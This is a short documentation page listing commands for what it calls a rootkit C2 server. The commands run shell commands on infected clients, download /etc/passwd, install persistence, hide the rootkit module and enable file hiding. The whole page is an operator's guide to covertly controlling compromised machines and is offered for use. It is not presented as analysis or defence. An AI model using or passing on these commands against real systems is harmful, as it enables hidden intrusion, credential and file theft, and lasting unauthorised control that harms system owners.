---
title: "Command Reference"
description: "Essential C2 commands"
icon: "terminal"
weight: 303
---

## Essential Commands

```bash
# Client Management
clients                      # List connected clients
auth 1 password             # Authenticate with client 1
exec 1 whoami               # Execute command on client 1
status 1                    # Get rootkit status

# File Operations  
upload 1 file.txt           # Upload file to client
download 1 /etc/passwd      # Download file from client
ls 1 /home                  # List directory on client

# Configuration
config 1                    # Interactive configuration menu
persist install 1           # Install persistence
persist remove 1            # Remove persistence

# Stealth Controls
hide 1                      # Hide rootkit module
unhide 1                    # Show rootkit module
enable-file-hiding 1        # Enable file hiding
disable-file-hiding 1       # Disable file hiding

# Utility
help                        # Show help
clear                       # Clear screen
exit                        # Exit server
```

**Note**: Use client index (1, 2, 3...) or client name. Authentication required for most commands. 